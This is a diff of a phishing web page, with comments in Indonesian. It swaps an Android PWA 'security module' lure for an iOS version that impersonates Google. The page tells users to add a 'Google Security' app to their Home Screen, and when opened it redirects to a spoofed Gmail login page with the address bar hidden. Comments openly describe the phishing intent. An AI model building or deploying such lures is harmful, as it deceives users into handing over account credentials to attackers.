@@ -1,73 +1,54 @@
 <!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="manifest" href="manifest.json">
-<style>
-  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; margin-top: 20px;}
-  #status { color: #9aa0a6; margin-bottom: 10px; font-size: 14px;}
-  #debug-log { font-size: 12px; color: #34a853; margin-top: 20px; text-align: left; padding: 10px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    
+    <!-- Meta Tags Sakti buat iOS Standalone -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Google Security">
+    
+    <!-- Icon yang bakal muncul di Home Screen iPhone -->
+    <link rel="apple-touch-icon" href="icon.png">
+
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #000; text-align: center; margin: 0; padding: 0; }
+        .ios-instruction { padding: 40px 20px; }
+        .fake-nav { position: fixed; bottom: 0; width: 100%; background: #f1f1f1; border-top: 1px solid #ccc; padding: 15px 0; display: block; }
+        .btn-ios { background: #007aff; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: 600; font-size: 16px; margin-top: 20px; }
+        #phishing-ui { display: none; }
+    </style>
 </head>
 <body>
-  <h2>System Security Update</h2>
-  <p id="status">Waiting for system handshake...</p>
-  
-  <button class="btn" id="installBtn">1. Activate Security Module</button>
-
-  <div id="debug-log">Status: Initializing...</div>
 
 <script>
-const log = (msg) => {
-    document.getElementById('debug-log').innerHTML += "<br>> " + msg;
-};
-
-// Cek standalone mode (buat phishing-nya)
-if (window.matchMedia('(display-mode: standalone)').matches) {
-    log("Standalone mode detected. Redirecting...");
+// Logic Standalone Mode buat iOS
+if (window.navigator.standalone === true) {
+    // IMPACT: Jika dibuka dari Home Screen, langsung tembak Phishing
+    // Di sini Address Bar Safari HILANG TOTAL!
     window.location.href = "login-gmail-spoof.html";
 }
-
-let deferredPrompt;
-const installBtn = document.getElementById('installBtn');
-const statusText = document.getElementById('status');
-
-log("Looking for manifest...");
-
-window.addEventListener('beforeinstallprompt', (e) => {
-    log("Event captured! Device compatible.");
-    e.preventDefault();
-    deferredPrompt = e;
-    
-    installBtn.style.display = 'block';
-    statusText.innerText = "Compatibility confirmed.";
-});
-
-installBtn.addEventListener('click', async () => {
-    if (deferredPrompt) {
-        log("Triggering prompt...");
-        deferredPrompt.prompt();
-        const { outcome } = await deferredPrompt.userChoice;
-        if (outcome === 'accepted') {
-            log("User accepted installation.");
-            alert("Security Module Installed. Open 'googlelogoligature' from Home Screen.");
-        }
-        deferredPrompt = null;
-    }
-});
-
-// Trick: Paksa user interaksi biar Chrome nembak event
-window.addEventListener('scroll', () => {
-    log("User interaction detected...");
-}, {once: true});
-
-// Tambahan buat mastiin service worker jalan (opsional tapi ngebantu PWA)
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js').then(() => {
-        log("Service Worker Active.");
-    });
-}
 </script>
+
+<div class="ios-instruction">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="120" style="margin-top:50px">
+    <h2>Update Keamanan iOS</h2>
+    <p>Untuk mengaktifkan enkripsi sistem, ikuti langkah di bawah:</p>
+    
+    <div style="background: #f8f9fa; padding: 20px; border-radius: 15px; margin-top: 30px; border: 1px solid #eee;">
+        <ol style="text-align: left; line-height: 1.6;">
+            <li>Klik tombol <b>Share</b> (ikon kotak panah ke atas) di bawah.</li>
+            <li>Scroll ke bawah dan pilih <b>"Add to Home Screen"</b>.</li>
+            <li>Buka aplikasi <b>"Google Security"</b> dari layar utama.</li>
+        </ol>
+    </div>
+</div>
+
+<!-- Fake UI Instruction buat mancing user -->
+<div class="fake-nav">
+    <p style="font-size: 14px; margin: 0;">Tap <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/IOS_Share_Icon.svg/1200px-IOS_Share_Icon.svg.png" width="20"> lalu <b>Add to Home Screen</b></p>
+</div>
+
 </body>
 </html>
